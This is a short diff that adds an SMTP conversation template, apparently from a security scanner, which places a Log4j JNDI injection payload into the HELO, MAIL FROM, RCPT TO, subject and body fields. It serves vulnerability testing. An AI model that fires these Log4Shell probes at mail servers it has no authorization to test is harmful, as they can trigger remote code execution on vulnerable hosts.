@@ -1,0 +1,12 @@
+HELO {{ .Fuzzer.PayloadJNDILog4J .Url.String "SMTP-HELLO" }}
+MAIL FROM: {{ .Fuzzer.PayloadJNDILog4J .Url.String "SMTP-FROM" }}
+RCPT TO: {{ .Fuzzer.PayloadJNDILog4J .Url.String "SMTP-RCPT" }}
+DATA
+Subject: {{ .Fuzzer.PayloadJNDILog4J .Url.String "SMTP-SUBJECT" }}
+
+Hello dear {{ .Fuzzer.PayloadJNDILog4J .Url.String "SMTP-BODY" }},
+
+I hope you're having fun with log4j.
+
+.
+
